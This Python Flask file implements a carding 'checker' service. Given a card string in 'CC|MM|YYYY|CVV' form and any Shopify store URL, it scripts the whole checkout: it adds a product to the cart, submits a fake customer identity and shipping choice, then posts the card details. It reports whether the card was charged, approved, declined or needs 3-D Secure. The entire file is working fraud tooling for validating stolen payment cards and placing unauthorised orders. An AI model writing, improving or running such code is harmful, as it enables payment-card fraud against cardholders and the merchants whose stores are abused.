import os
import time
import random
import asyncio
import aiohttp
from flask import Flask, request, jsonify

app = Flask(__name__)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}

async def shopify_check(cc, mm, yy, cvv, site):
    start = time.time()
    
    try:
        timeout = aiohttp.ClientTimeout(total=60)
        connector = aiohttp.TCPConnector(ssl=False)
        
        async with aiohttp.ClientSession(
            headers=HEADERS,
            connector=connector,
            timeout=timeout
        ) as session:

            # Step 1: Get product page + token
            product_url = f"{site}/products.json?limit=1"
            async with session.get(product_url) as resp:
                if resp.status != 200:
                    return {"success": False, "Response": "CART_FAILED", "Gate": "Shopify", "Price": "0", "Charged": "False", "Approved": "False", "Time": f"{round(time.time()-start,1)}s"}
                
                products = await resp.json()
                if not products.get("products"):
                    return {"success": False, "Response": "NO_PRODUCTS", "Gate": "Shopify", "Price": "0", "Charged": "False", "Approved": "False", "Time": f"{round(time.time()-start,1)}s"}
                
                variant_id = products["products"][0]["variants"][0]["id"]

            # Step 2: Add to cart
            cart_data = {
                "items": [{
                    "id": variant_id,
                    "quantity": 1
                }]
            }
            async with session.post(f"{site}/cart/add.js", json=cart_data) as resp:
                if resp.status != 200:
                    return {"success": False, "Response": "CART_FAILED", "Gate": "Shopify", "Price": "0", "Charged": "False", "Approved": "False", "Time": f"{round(time.time()-start,1)}s"}
                cart_resp = await resp.json()
                price = str(round(cart_resp.get("price", 100) / 100, 2))

            # Step 3: Get checkout token
            async with session.post(f"{site}/cart/checkout.js") as resp:
                checkout_text = await resp.text()

            async with session.get(f"{site}/checkout") as resp:
                checkout_url = str(resp.url)
                checkout_token = checkout_url.split("/checkouts/")[-1].split("?")[0] if "/checkouts/" in checkout_url else None

            if not checkout_token:
                return {"success": False, "Response": "CHECKOUT_FAILED", "Gate": "Shopify", "Price": price, "Charged": "False", "Approved": "False", "Time": f"{round(time.time()-start,1)}s"}

            # Step 4: Submit contact info
            contact_data = {
                "_method": "patch",
                "authenticity_token": "",
                "previous_step": "contact_information",
                "step": "shipping_method",
                "checkout[email]": f"test{random.randint(1000,9999)}@gmail.com",
                "checkout[shipping_address][first_name]": "John",
                "checkout[shipping_address][last_name]": "Smith",
                "checkout[shipping_address][address1]": "123 Main St",
                "checkout[shipping_address][city]": "New York",
                "checkout[shipping_address][country]": "United States",
                "checkout[shipping_address][province]": "New York",
                "checkout[shipping_address][zip]": "10001",
                "checkout[shipping_address][phone]": "5551234567",
            }
            
            async with session.post(
                f"{site}/checkouts/{checkout_token}",
                data=contact_data,
                allow_redirects=True
            ) as resp:
                pass

            # Step 5: Get shipping rates
            async with session.get(
                f"{site}/checkouts/{checkout_token}?step=shipping_method"
            ) as resp:
                shipping_text = await resp.text()

            # Step 6: Submit shipping
            shipping_data = {
                "_method": "patch",
                "previous_step": "shipping_method",
                "step": "payment_method",
                "checkout[shipping_rate][id]": "shopify-Standard%20Shipping-0.00",
            }
            async with session.post(
                f"{site}/checkouts/{checkout_token}",
                data=shipping_data,
                allow_redirects=True
            ) as resp:
                pass

            # Step 7: Get payment page + gateway token
            async with session.get(
                f"{site}/checkouts/{checkout_token}?step=payment_method"
            ) as resp:
                payment_page = await resp.text()

            # Extract gateway
            gateway = "Shopify Payments"
            if "stripe" in payment_page.lower():
                gateway = "Stripe"
            elif "braintree" in payment_page.lower():
                gateway = "Braintree"

            # Extract authenticity token
            auth_token = ""
            if 'name="authenticity_token"' in payment_page:
                auth_token = payment_page.split('name="authenticity_token" value="')[1].split('"')[0]

            # Step 8: Submit payment
            yy_full = yy if len(str(yy)) == 4 else f"20{yy}"
            
            payment_data = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "previous_step": "payment_method",
                "step": "",
                "checkout[credit_card][number]": cc,
                "checkout[credit_card][name]": "John Smith",
                "checkout[credit_card][month]": mm,
                "checkout[credit_card][year]": yy_full,
                "checkout[credit_card][verification_value]": cvv,
                "checkout[payment_gateway]": "",
                "checkout[total_price]": "",
            }

            async with session.post(
                f"{site}/checkouts/{checkout_token}",
                data=payment_data,
                allow_redirects=True
            ) as resp:
                result_text = await resp.text()
                result_url = str(resp.url)

            elapsed = round(time.time() - start, 1)

            # Parse result
            if "thank_you" in result_url or "thank-you" in result_url:
                return {"success": True, "Response": "ORDER_PLACED", "Gate": gateway, "Price": price, "Charged": "True", "Approved": "True", "Time": f"{elapsed}s"}
            elif "insufficient" in result_text.lower():
                return {"success": False, "Response": "INSUFFICIENT_FUNDS", "Gate": gateway, "Price": price, "Charged": "False", "Approved": "True", "Time": f"{elapsed}s"}
            elif "authentication" in result_text.lower() or "3d secure" in result_text.lower() or "3ds" in result_text.lower():
                return {"success": False, "Response": "3DS_REQUIRED", "Gate": gateway, "Price": price, "Charged": "False", "Approved": "False", "Time": f"{elapsed}s"}
            elif "declined" in result_text.lower() or "card was declined" in result_text.lower():
                return {"success": False, "Response": "CARD_DECLINED", "Gate": gateway, "Price": price, "Charged": "False", "Approved": "False", "Time": f"{elapsed}s"}
            elif "payment" in result_url:
                return {"success": False, "Response": "CARD_DECLINED", "Gate": gateway, "Price": price, "Charged": "False", "Approved": "False", "Time": f"{elapsed}s"}
            else:
                return {"success": False, "Response": "UNKNOWN", "Gate": gateway, "Price": price, "Charged": "False", "Approved": "False", "Time": f"{elapsed}s"}

    except asyncio.TimeoutError:
        return {"success": False, "Response": "TIMEOUT", "Gate": "Shopify", "Price": "0", "Charged": "False", "Approved": "False", "Time": f"{round(time.time()-start,1)}s"}
    except Exception as e:
        return {"success": False, "Response": f"ERROR_{str(e)[:30]}", "Gate": "Shopify", "Price": "0", "Charged": "False", "Approved": "False", "Time": f"{round(time.time()-start,1)}s"}


@app.route("/", methods=["GET"])
def check():
    card = request.args.get("card", "")
    site = request.args.get("site", "")

    if not card:
        return jsonify({"success": False, "message": "Missing card parameter. Use: ?card=CC|MM|YYYY|CVV"})
    if not site:
        return jsonify({"success": False, "message": "Missing site parameter. Use: &site=https://store.myshopify.com"})

    parts = card.split("|")
    if len(parts) != 4:
        return jsonify({"success": False, "message": "Invalid card format. Use: CC|MM|YYYY|CVV"})

    cc, mm, yy, cvv = parts

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(shopify_check(cc, mm, yy, cvv, site))
    finally:
        loop.close()

    return jsonify(result)


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "message": "Shopify Node Running"})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)